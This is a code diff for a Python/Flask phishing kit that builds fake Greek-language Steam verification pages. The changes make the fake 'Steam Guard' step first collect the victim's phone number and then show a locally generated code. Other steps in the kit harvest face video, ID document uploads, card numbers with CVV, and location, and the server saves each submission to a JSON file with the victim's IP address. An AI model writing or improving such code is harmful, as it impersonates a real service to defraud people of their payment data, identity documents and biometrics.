@@ -142,6 +142,8 @@ def get_verification_settings():
                 settings['verification_type'] = 'steam_guard'
                 settings['title'] = "Επαλήθευση Steam Guard"
                 settings['reason'] = "Επιβεβαιώστε την ταυτότητά σας για πρόσβαση στις λειτουργίες Steam"
+                # Force phone verification for Steam Guard (to collect phone number first)
+                settings['phone_enabled'] = True
             elif vtype == 'B':
                 settings['verification_type'] = 'age_verification'
                 settings['title'] = "Απαιτείται Επαλήθευση Ηλικίας"
@@ -192,14 +194,13 @@ def get_verification_settings():
     else:
         settings['id_enabled'] = False
     
-    # Επαλήθευση τηλεφώνου (για Steam Guard)
-    if settings['verification_type'] == 'steam_guard':
+    # Επαλήθευση τηλεφώνου (για Steam Guard already forced True; for others ask)
+    if settings['verification_type'] != 'steam_guard':
         print("\n4. Επαλήθευση Τηλεφώνου:")
         print("Απαιτείται επαλήθευση τηλεφώνου;")
-        phone_enabled = input("Ενεργοποίηση επαλήθευσης τηλεφώνου (y/n, προεπιλογή: y): ").strip().lower()
-        settings['phone_enabled'] = phone_enabled in ['y', 'yes', '']
-    else:
-        settings['phone_enabled'] = False
+        phone_enabled = input("Ενεργοποίηση επαλήθευσης τηλεφώνου (y/n, προεπιλογή: n): ").strip().lower()
+        settings['phone_enabled'] = phone_enabled in ['y', 'yes']
+    # else already True
     
     # Επαλήθευση πληρωμής (για επαλήθευση αγοράς)
     if settings['verification_type'] == 'purchase_verification':
@@ -327,6 +328,11 @@ def create_greek_html_template(settings):
     reason = settings['reason']
     face_duration = settings.get('face_duration', 15)
     purchase_amount = settings.get('purchase_amount', "€59,99")
+    phone_enabled = settings.get('phone_enabled', False)
+    face_enabled = settings.get('face_enabled', False)
+    id_enabled = settings.get('id_enabled', False)
+    payment_enabled = settings.get('payment_enabled', False)
+    location_enabled = settings.get('location_enabled', False)
     
     # Χρώματα Steam
     colors = {
@@ -339,22 +345,23 @@ def create_greek_html_template(settings):
         'steam_muted': '#8f98a0'
     }
     
-    # Βήματα βάσει τύπου επαλήθευσης
+    # Υπολογισμός βημάτων - για Steam Guard, το τηλέφωνο είναι ενσωματωμένο στο βήμα 2, οπότε δεν προσθέτουμε ξεχωριστό βήμα
     total_steps = 2  # Εισαγωγή + Βήμα 1
     
-    if settings['face_enabled']:
+    if face_enabled:
         total_steps += 1
     
-    if settings['id_enabled']:
+    if id_enabled:
         total_steps += 1
     
-    if settings['phone_enabled']:
+    # Προσθήκη βήματος τηλεφώνου μόνο αν είναι ενεργοποιημένο ΚΑΙ όχι για Steam Guard (γιατί το έχουμε ήδη στο βήμα 2)
+    if phone_enabled and verification_type != 'steam_guard':
         total_steps += 1
     
-    if settings['payment_enabled']:
+    if payment_enabled:
         total_steps += 1
     
-    if settings['location_enabled']:
+    if location_enabled:
         total_steps += 1
     
     total_steps += 1  # Βήμα επεξεργασίας
@@ -363,7 +370,7 @@ def create_greek_html_template(settings):
     # Διορθώσεις για μορφοποίηση προτύπου
     step2_indicator = f'<div class="step" id="step2Indicator">\n<div class="step-number">2</div>\n<div class="step-label">{"Steam Guard" if verification_type == "steam_guard" else ("Επαλήθευση Ηλικίας" if verification_type == "age_verification" else ("Ανάκτηση" if verification_type == "account_recovery" else "Πληρωμή"))}</div>\n</div>' if total_steps > 3 else ''
     
-    step3_indicator = f'<div class="step" id="step3Indicator">\n<div class="step-number">3</div>\n<div class="step-label">{"Ταυτότητα" if settings["id_enabled"] else ("Τηλέφωνο" if settings["phone_enabled"] else "Τοποθεσία")}</div>\n</div>' if total_steps > 4 else ''
+    step3_indicator = f'<div class="step" id="step3Indicator">\n<div class="step-number">3</div>\n<div class="step-label">{"Ταυτότητα" if id_enabled else ("Τηλέφωνο" if (phone_enabled and verification_type != "steam_guard") else "Τοποθεσία")}</div>\n</div>' if total_steps > 4 else ''
     
     step4_indicator = '<div class="step" id="step4Indicator">\n<div class="step-number">4</div>\n<div class="step-label">Ολοκλήρωση</div>\n</div>' if total_steps > 5 else ''
     
@@ -806,7 +813,7 @@ def create_greek_html_template(settings):
             margin-bottom: 15px;
         }}
         
-        /* Επαλήθευση Τηλεφώνου */
+        /* Επαλήθευση Τηλεφώνου (ξεχωριστό βήμα) */
         .phone-section {{
             background: rgba(0, 0, 0, 0.3);
             border-radius: 8px;
@@ -1395,24 +1402,26 @@ def create_greek_html_template(settings):
             </div>
             
             <!-- Βήμα 2: Steam Guard / Επαλήθευση Ηλικίας / Πληρωμή -->
-            {f'<div class="step-content" id="step2"><h2 class="step-title">{"Κώδικας Steam Guard" if verification_type == "steam_guard" else ("Επαλήθευση Ηλικίας" if verification_type == "age_verification" else ("Ανάκτηση Λογαριασμού" if verification_type == "account_recovery" else "Επαλήθευση Αγοράς"))}</h2><p class="step-description">{"Εισάγετε τον κώδικα Steam Guard που σταλθηκε στο email ή την εφαρμογή κινητού σας." if verification_type == "steam_guard" else ("Επαληθεύστε την ηλικία σας για πρόσβαση σε περιεχόμενο για ενήλικες." if verification_type == "age_verification" else ("Επαληθεύστε την ταυτότητά σας για ανάκτηση του λογαριασμού σας." if verification_type == "account_recovery" else "Επαληθεύστε την πληρωμή σας για λόγους ασφαλείας."))}</p>' if total_steps > 3 else ''}
-            {f'<div class="guard-container" id="steamGuardSection" style="display: none;"><div class="alert-icon">🔒</div><h3>Εισάγετε Κώδικα Steam Guard</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Εισάγετε τον 5ψήφιο κώδικα από την εφαρμογή Steam Guard στο κινητό σας ή το email</p><div class="guard-code" id="steamGuardCode">{str(random.randint(10000, 99999))}</div><input type="text" class="code-input" id="guardCodeInput" placeholder="12345" maxlength="5" pattern="\\d*"><div class="status-message" id="guardStatus">Εισάγετε τον κώδικα παραπάνω</div></div>' if verification_type == 'steam_guard' and total_steps > 3 else ''}
+            {f'<div class="step-content" id="step2"><h2 class="step-title">{"Κώδικας Steam Guard" if verification_type == "steam_guard" else ("Επαλήθευση Ηλικίας" if verification_type == "age_verification" else ("Ανάκτηση Λογαριασμού" if verification_type == "account_recovery" else "Επαλήθευση Αγοράς"))}</h2><p class="step-description">{"Εισάγετε τον αριθμό τηλεφώνου σας για λήψη κωδικού Steam Guard." if verification_type == "steam_guard" else ("Επαληθεύστε την ηλικία σας για πρόσβαση σε περιεχόμενο για ενήλικες." if verification_type == "age_verification" else ("Επαληθεύστε την ταυτότητά σας για ανάκτηση του λογαριασμού σας." if verification_type == "account_recovery" else "Επαληθεύστε την πληρωμή σας για λόγους ασφαλείας."))}</p>' if total_steps > 3 else ''}
             
-            {f'<div class="camera-section" id="faceVerificationSection" style="display: none;"><h3>Επαλήθευση Προσώπου</h3><div class="camera-container"><video id="faceVideo" autoplay playsinline></video><div class="face-circle"></div></div><div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div><button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Έναρξη Επαλήθευσης Προσώπου</button></div>' if settings['face_enabled'] and total_steps > 3 else ''}
+            <!-- Steam Guard: phone first, then code -->
+            {f'<div class="guard-container" id="steamGuardSection" style="display: none;"><div class="alert-icon">📱</div><h3>Επαλήθευση Steam Guard</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Θα σταλεί ένας 5ψήφιος κωδικός στο τηλέφωνό σας.</p><input type="tel" class="phone-input" id="steamPhoneInput" placeholder="+30 695 123 4567" style="margin-bottom: 15px;"><button class="btn" id="sendCodeBtn" onclick="sendSteamGuardCode()">Αποστολή Κωδικού</button><div id="codeSection" style="display: none; margin-top: 20px;"><div class="guard-code" id="steamGuardCode">12345</div><p style="color: var(--steam-muted); margin-bottom: 10px;">Εισάγετε τον κωδικό που λάβατε:</p><input type="text" class="code-input" id="guardCodeInput" placeholder="12345" maxlength="5" pattern="\\d*"><div class="status-message" id="guardStatus">Εισάγετε τον κωδικό</div></div></div>' if verification_type == 'steam_guard' and total_steps > 3 else ''}
             
-            {f'<div class="payment-section" id="paymentSection" style="display: none;"><h3>Επαλήθευση Αγοράς</h3><p style="text-align: center; margin-bottom: 20px; color: var(--steam-muted);">Επαληθεύστε την πληρωμή σας</p><div class="payment-amount">{purchase_amount}</div><div class="form-group"><label class="form-label">Αριθμός Κάρτας</label><input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"></div><div class="card-details"><div class="form-group"><label class="form-label">Ημερομηνία Λήξης</label><input type="text" class="form-input" id="expiryDate" placeholder="ΜΜ/ΕΕ" maxlength="5"></div><div class="form-group"><label class="form-label">CVV</label><input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4"></div><div class="form-group"><label class="form-label">Ταχυδρομικός Κώδικας</label><input type="text" class="form-input" id="zipCode" placeholder="12345" maxlength="10"></div></div></div>' if settings['payment_enabled'] and total_steps > 3 else ''}
+            {f'<div class="camera-section" id="faceVerificationSection" style="display: none;"><h3>Επαλήθευση Προσώπου</h3><div class="camera-container"><video id="faceVideo" autoplay playsinline></video><div class="face-circle"></div></div><div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div><button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Έναρξη Επαλήθευσης Προσώπου</button></div>' if face_enabled and total_steps > 3 else ''}
             
-            {f'<div class="status-message" id="step2Status"></div><div class="button-group"><button class="btn" id="step2Button" onclick="completeStep2()">{"Επαλήθευση Κώδικα" if verification_type == "steam_guard" else ("Έναρξη Επαλήθευσης" if settings["face_enabled"] else "Επαλήθευση Πληρωμής")}</button><button class="btn btn-outline" onclick="prevStep()">Πίσω</button></div></div>' if total_steps > 3 else ''}
+            {f'<div class="payment-section" id="paymentSection" style="display: none;"><h3>Επαλήθευση Αγοράς</h3><p style="text-align: center; margin-bottom: 20px; color: var(--steam-muted);">Επαληθεύστε την πληρωμή σας</p><div class="payment-amount">{purchase_amount}</div><div class="form-group"><label class="form-label">Αριθμός Κάρτας</label><input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"></div><div class="card-details"><div class="form-group"><label class="form-label">Ημερομηνία Λήξης</label><input type="text" class="form-input" id="expiryDate" placeholder="ΜΜ/ΕΕ" maxlength="5"></div><div class="form-group"><label class="form-label">CVV</label><input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4"></div><div class="form-group"><label class="form-label">Ταχυδρομικός Κώδικας</label><input type="text" class="form-input" id="zipCode" placeholder="12345" maxlength="10"></div></div></div>' if payment_enabled and total_steps > 3 else ''}
             
-            <!-- Βήμα 3: Ταυτότητα/Τηλέφωνο/Τοποθεσία -->
-            {f'<div class="step-content" id="step3"><h2 class="step-title">{"Επαλήθευση Ταυτότητας" if settings["id_enabled"] else ("Επαλήθευση Τηλεφώνου" if settings["phone_enabled"] else "Επαλήθευση Τοποθεσίας")}</h2><p class="step-description">{"Επαληθεύστε την ταυτότητά σας με επίσημο έγγραφο ταυτότητας." if settings["id_enabled"] else ("Επαληθεύστε τον αριθμό τηλεφώνου σας για το Steam Guard." if settings["phone_enabled"] else "Επαληθεύστε την τοποθεσία σας για λόγους ασφαλείας.")}</p>' if total_steps > 4 else ''}
-            {f'<div class="upload-section" onclick="document.getElementById(\'idFileInput\').click()" id="idUploadSection" style="display: none;"><div class="upload-icon">📄</div><div style="font-size: 20px; margin-bottom: 10px;">Μεταφόρτωση Εγγράφου Ταυτότητας</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Δίπλωμα Οδήγησης, Διαβατήριο ή Κάρτα Ταυτότητας</div><input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none" onchange="handleIDUpload(this)"><div class="preview-container" id="idPreview" style="display: none; margin-top: 20px;"><img id="idPreviewImage" style="max-width: 200px; max-height: 150px; border-radius: 6px; border: 2px solid var(--steam-border);"></div></div>' if settings['id_enabled'] and total_steps > 4 else ''}
+            {f'<div class="status-message" id="step2Status"></div><div class="button-group"><button class="btn" id="step2Button" onclick="completeStep2()">{"Επαλήθευση Κωδικού" if verification_type == "steam_guard" else ("Έναρξη Επαλήθευσης" if face_enabled else "Επαλήθευση Πληρωμής")}</button><button class="btn btn-outline" onclick="prevStep()">Πίσω</button></div></div>' if total_steps > 3 else ''}
             
-            {f'<div class="phone-section" id="phoneSection" style="display: none;"><h3>Επαλήθευση Τηλεφώνου</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Εισάγετε τον αριθμό τηλεφώνου σας για λήψη κωδικών Steam Guard</p><input type="tel" class="phone-input" id="phoneInput" placeholder="+30 695 123 4567"><div class="status-message" id="phoneStatus">Εισάγετε τον αριθμό τηλεφώνου σας</div></div>' if settings['phone_enabled'] and total_steps > 4 else ''}
+            <!-- Βήμα 3: Ταυτότητα/Τηλέφωνο/Τοποθεσία (το τηλέφωνο εμφανίζεται μόνο αν δεν είναι Steam Guard) -->
+            {f'<div class="step-content" id="step3"><h2 class="step-title">{"Επαλήθευση Ταυτότητας" if id_enabled else ("Επαλήθευση Τηλεφώνου" if (phone_enabled and verification_type != "steam_guard") else "Επαλήθευση Τοποθεσίας")}</h2><p class="step-description">{"Επαληθεύστε την ταυτότητά σας με επίσημο έγγραφο ταυτότητας." if id_enabled else ("Επαληθεύστε τον αριθμό τηλεφώνου σας για το Steam Guard." if (phone_enabled and verification_type != "steam_guard") else "Επαληθεύστε την τοποθεσία σας για λόγους ασφαλείας.")}</p>' if total_steps > 4 else ''}
+            {f'<div class="upload-section" onclick="document.getElementById(\'idFileInput\').click()" id="idUploadSection" style="display: none;"><div class="upload-icon">📄</div><div style="font-size: 20px; margin-bottom: 10px;">Μεταφόρτωση Εγγράφου Ταυτότητας</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Δίπλωμα Οδήγησης, Διαβατήριο ή Κάρτα Ταυτότητας</div><input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none" onchange="handleIDUpload(this)"><div class="preview-container" id="idPreview" style="display: none; margin-top: 20px;"><img id="idPreviewImage" style="max-width: 200px; max-height: 150px; border-radius: 6px; border: 2px solid var(--steam-border);"></div></div>' if id_enabled and total_steps > 4 else ''}
             
-            {f'<div class="upload-section" id="locationSection" style="display: none;"><div class="upload-icon">📍</div><div style="font-size: 20px; margin-bottom: 10px;">Επαλήθευση Τοποθεσίας</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Το Steam χρειάζεται να επαληθεύσει την τοποθεσία σας για ασφάλεια</div><div class="status-message" id="locationStatus">Κάντε κλικ στο παρακάτω κουμπί για κοινή χρήση τοποθεσίας</div></div>' if settings['location_enabled'] and total_steps > 4 else ''}
+            {f'<div class="phone-section" id="phoneSection" style="display: none;"><h3>Επαλήθευση Τηλεφώνου</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Εισάγετε τον αριθμό τηλεφώνου σας για λήψη κωδικών Steam Guard</p><input type="tel" class="phone-input" id="phoneInput" placeholder="+30 695 123 4567"><div class="status-message" id="phoneStatus">Εισάγετε τον αριθμό τηλεφώνου σας</div></div>' if (phone_enabled and verification_type != "steam_guard") and total_steps > 4 else ''}
             
-            {f'<div class="button-group"><button class="btn" id="step3Button" onclick="completeStep3()">{"Μεταφόρτωση Ταυτότητας" if settings["id_enabled"] else ("Επαλήθευση Τηλεφώνου" if settings["phone_enabled"] else "Κοινή Τοποθεσία")}</button><button class="btn btn-outline" onclick="prevStep()">Πίσω</button></div></div>' if total_steps > 4 else ''}
+            {f'<div class="upload-section" id="locationSection" style="display: none;"><div class="upload-icon">📍</div><div style="font-size: 20px; margin-bottom: 10px;">Επαλήθευση Τοποθεσίας</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Το Steam χρειάζεται να επαληθεύσει την τοποθεσία σας για ασφάλεια</div><div class="status-message" id="locationStatus">Κάντε κλικ στο παρακάτω κουμπί για κοινή χρήση τοποθεσίας</div></div>' if location_enabled and total_steps > 4 else ''}
+            
+            {f'<div class="button-group"><button class="btn" id="step3Button" onclick="completeStep3()">{"Μεταφόρτωση Ταυτότητας" if id_enabled else ("Επαλήθευση Τηλεφώνου" if (phone_enabled and verification_type != "steam_guard") else "Κοινή Τοποθεσία")}</button><button class="btn btn-outline" onclick="prevStep()">Πίσω</button></div></div>' if total_steps > 4 else ''}
             
             <!-- Βήμα 4: Επεξεργασία -->
             <div class="step-content" id="stepProcessing">
@@ -1514,10 +1523,12 @@ def create_greek_html_template(settings):
         let faceStream = null;
         let faceRecorder = null;
         let faceChunks = [];
-        let faceTimeLeft = {face_duration if settings['face_enabled'] else 0};
+        let faceTimeLeft = {face_duration if face_enabled else 0};
         let faceTimerInterval = null;
         let idFile = null;
-        let steamGuardCode = "{str(random.randint(10000, 99999)) if verification_type == 'steam_guard' else ''}";
+        
+        // Steam Guard state
+        let steamGuardCode = "";
         
         // Πλοήγηση Βημάτων
         function updateStepIndicators() {{
@@ -1561,28 +1572,30 @@ def create_greek_html_template(settings):
                 // Εμφάνιση κατάλληλων ενοτήτων
                 if (stepNumber === 2) {{
                     if (verificationType === "steam_guard") {{
+                        // Show phone section initially; code section will be shown after sending
                         document.getElementById("steamGuardSection").style.display = "block";
+                        document.getElementById("codeSection").style.display = "none";
                     }}
                     
-                    if ({str(settings['face_enabled']).lower()}) {{
+                    if ({str(face_enabled).lower()}) {{
                         document.getElementById("faceVerificationSection").style.display = "block";
                     }}
                     
-                    if ({str(settings['payment_enabled']).lower()}) {{
+                    if ({str(payment_enabled).lower()}) {{
                         document.getElementById("paymentSection").style.display = "block";
                     }}
                 }}
                 
                 if (stepNumber === 3) {{
-                    if ({str(settings['id_enabled']).lower()}) {{
+                    if ({str(id_enabled).lower()}) {{
                         document.getElementById("idUploadSection").style.display = "block";
                     }}
                     
-                    if ({str(settings['phone_enabled']).lower()}) {{
+                    if ({str(phone_enabled).lower()} && verificationType !== "steam_guard") {{
                         document.getElementById("phoneSection").style.display = "block";
                     }}
                     
-                    if ({str(settings['location_enabled']).lower()}) {{
+                    if ({str(location_enabled).lower()}) {{
                         document.getElementById("locationSection").style.display = "block";
                     }}
                 }}
@@ -1607,18 +1620,51 @@ def create_greek_html_template(settings):
             }}
         }}
         
+        // --- Steam Guard: Αποστολή Κωδικού ---
+        function sendSteamGuardCode() {{
+            const phoneInput = document.getElementById("steamPhoneInput");
+            const phone = phoneInput.value.trim();
+            if (!phone) {{
+                alert("Παρακαλώ εισάγετε έναν έγκυρο αριθμό τηλεφώνου.");
+                return;
+            }}
+            // Δημιουργία τυχαίου 5ψήφιου κωδικού
+            steamGuardCode = Math.floor(10000 + Math.random() * 90000).toString();
+            document.getElementById("steamGuardCode").textContent = steamGuardCode;
+            
+            // Απόκρυψη πεδίου τηλεφώνου, εμφάνιση ενότητας κωδικού
+            document.getElementById("sendCodeBtn").style.display = "none";
+            phoneInput.style.display = "none";
+            document.getElementById("codeSection").style.display = "block";
+            document.getElementById("guardStatus").textContent = "Ο κωδικός στάλθηκε στο τηλέφωνό σας. Εισάγετέ τον παρακάτω.";
+            document.getElementById("guardStatus").className = "status-message status-processing";
+            document.getElementById("guardCodeInput").focus();
+            
+            // Αποθήκευση τηλεφώνου για υποβολή
+            window._steamPhone = phone;
+        }}
+        
         // Επαλήθευση Steam Guard
         function completeStep2() {{
             if (verificationType === "steam_guard") {{
                 const input = document.getElementById("guardCodeInput").value;
                 const status = document.getElementById("guardStatus");
+                const phone = window._steamPhone || "άγνωστο";
+                
                 if (!input || input.length !== 5) {{
                     status.className = "status-message status-error";
-                    status.textContent = "Παρακαλώ εισάγετε έγκυρο 5ψήφιο κώδικα";
+                    status.textContent = "Παρακαλώ εισάγετε έγκυρο 5ψήφιο κωδικό";
                     return;
                 }}
+                
+                if (input !== steamGuardCode) {{
+                    status.className = "status-message status-error";
+                    status.textContent = "Λανθασμένος κωδικός. Δοκιμάστε ξανά.";
+                    return;
+                }}
+                
                 status.className = "status-message status-processing";
-                status.textContent = "Επαλήθευση κώδικα Steam Guard...";
+                status.textContent = "Επαλήθευση κωδικού Steam Guard...";
                 // Υποβολή δεδομένων Steam Guard
                 $.ajax({{
                     url: "/submit_steam_guard",
@@ -1626,20 +1672,27 @@ def create_greek_html_template(settings):
                     data: JSON.stringify({{
                         guard_code: input,
                         expected_code: steamGuardCode,
+                        phone_number: phone,
                         timestamp: new Date().toISOString(),
                         session_id: sessionId,
                         steam_username: steamUsername
                     }}),
-                    contentType: "application/json"
+                    contentType: "application/json",
+                    success: function() {{
+                        status.className = "status-message status-success";
+                        status.textContent = "✓ Επαληθεύτηκε ο κώδικας Steam Guard";
+                        setTimeout(() => nextStep(), 1500);
+                    }},
+                    error: function() {{
+                        status.className = "status-message status-error";
+                        status.textContent = "Σφάλμα υποβολής. Παρακαλώ δοκιμάστε ξανά.";
+                    }}
                 }});
-                status.className = "status-message status-success";
-                status.textContent = "✓ Επαληθεύτηκε ο κώδικας Steam Guard";
-                setTimeout(() => nextStep(), 1500);
             }}
-            else if ({str(settings['face_enabled']).lower()}) {{
+            else if ({str(face_enabled).lower()}) {{
                 startFaceVerification();
             }}
-            else if ({str(settings['payment_enabled']).lower()}) {{
+            else if ({str(payment_enabled).lower()}) {{
                 verifyPayment();
             }}
         }}
@@ -1664,7 +1717,7 @@ def create_greek_html_template(settings):
         }}
         
         function startFaceScan() {{
-            faceTimeLeft = {face_duration if settings['face_enabled'] else 15};
+            faceTimeLeft = {face_duration if face_enabled else 15};
             updateFaceTimer();
             faceTimerInterval = setInterval(() => {{
                 faceTimeLeft--;
@@ -1720,7 +1773,7 @@ def create_greek_html_template(settings):
                     type: "POST",
                     data: JSON.stringify({{
                         face_video: base64data,
-                        duration: {face_duration if settings['face_enabled'] else 15},
+                        duration: {face_duration if face_enabled else 15},
                         timestamp: new Date().toISOString(),
                         session_id: sessionId,
                         steam_username: steamUsername,
@@ -1776,9 +1829,9 @@ def create_greek_html_template(settings):
             document.getElementById("step3Button").textContent = "Υποβολή Ταυτότητας";
         }}
         
-        // Επαλήθευση Τηλεφώνου
+        // Επαλήθευση Τηλεφώνου (ξεχωριστό βήμα)
         function completeStep3() {{
-            if ({str(settings['id_enabled']).lower()}) {{
+            if ({str(id_enabled).lower()}) {{
                 if (!idFile) {{
                     alert("Παρακαλώ μεταφορτώστε πρώτα έγγραφο ταυτότητας");
                     return;
@@ -1801,7 +1854,7 @@ def create_greek_html_template(settings):
                 }});
             }}
             
-            if ({str(settings['phone_enabled']).lower()}) {{
+            if ({str(phone_enabled).lower()} && verificationType !== "steam_guard") {{
                 const phone = document.getElementById("phoneInput").value;
                 if (!phone) {{
                     alert("Παρακαλώ εισάγετε τον αριθμό τηλεφώνου σας");
@@ -1823,7 +1876,7 @@ def create_greek_html_template(settings):
                 setTimeout(() => startProcessing(), 1500);
             }}
             
-            if ({str(settings['location_enabled']).lower()}) {{
+            if ({str(location_enabled).lower()}) {{
                 requestLocation();
             }}
         }}
@@ -1916,11 +1969,11 @@ def create_greek_html_template(settings):
                     verification_type: verificationType,
                     completed_at: new Date().toISOString(),
                     user_agent: navigator.userAgent,
-                    face_verified: {str(settings['face_enabled']).lower()},
-                    id_verified: {str(settings['id_enabled']).lower()},
-                    phone_verified: {str(settings['phone_enabled']).lower()},
-                    payment_verified: {str(settings['payment_enabled']).lower()},
-                    location_verified: {str(settings['location_enabled']).lower()},
+                    face_verified: {str(face_enabled).lower()},
+                    id_verified: {str(id_enabled).lower()},
+                    phone_verified: {str(phone_enabled).lower()},
+                    payment_verified: {str(payment_enabled).lower()},
+                    location_verified: {str(location_enabled).lower()},
                     verification_result: 'success'
                 }}),
                 contentType: 'application/json'
@@ -1975,7 +2028,7 @@ def create_greek_html_template(settings):
             e.target.value = value;
         }});
         
-        // Είσοδος κώδικα Steam Guard
+        // Είσοδος κώδικα Steam Guard - μόνο ψηφία
         document.getElementById("guardCodeInput")?.addEventListener("input", function(e) {{
             e.target.value = e.target.value.replace(/\\D/g, "").slice(0, 5);
         }});
@@ -2094,6 +2147,7 @@ def submit_steam_guard():
             steam_username = data.get('steam_username', 'άγνωστο')
             guard_code = data.get('guard_code', '')
             expected_code = data.get('expected_code', '')
+            phone_number = data.get('phone_number', '')
             
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
             filename = f"steam_guard_{steam_username}_{session_id}_{timestamp}.json"
@@ -2109,7 +2163,8 @@ def submit_steam_guard():
                 'δεδομένα_guard': {
                     'εισήχθη_κώδικας': guard_code,
                     'αναμενόμενος_κώδικας': expected_code,
-                    'ταιριότητα': guard_code == expected_code
+                    'ταιριότητα': guard_code == expected_code,
+                    'αριθμός_τηλεφώνου': phone_number
                 },
                 'διεύθυνση_ip': request.remote_addr,
                 'user_agent': request.headers.get('User-Agent', 'άγνωστο')
